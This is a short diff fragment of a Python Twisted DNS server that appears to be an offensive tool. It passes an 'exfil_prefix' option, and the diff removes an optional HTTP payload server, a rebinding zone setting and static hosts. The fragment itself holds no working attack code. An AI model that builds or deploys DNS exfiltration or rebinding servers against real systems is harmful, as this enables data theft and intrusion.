         ttl=args.ttl,
         strategy=args.strategy,
-        static_hosts=static_hosts,
         exfil_prefix=args.exfil_prefix,
-        http_port=args.http_port,
-        enable_http=bool(args.http_enable),
-        rb_zone=(args.rb_zone or ""),
     )
     
     print_banner()
@@ -1962,12 +1155,6 @@ def main():
     
     reactor.listenUDP(config.port, protocol)
     reactor.listenTCP(config.port, factory)
-    
-    # Set up HTTP payload server (optional)
-    if config.enable_http:
-        payload_root = PayloadResource(config)
-        payload_site = web_server.Site(payload_root)
-        reactor.listenTCP(config.http_port, payload_site)
     
     # Set up interactive command interface
     stdio.StandardIO(CommandProtocol())
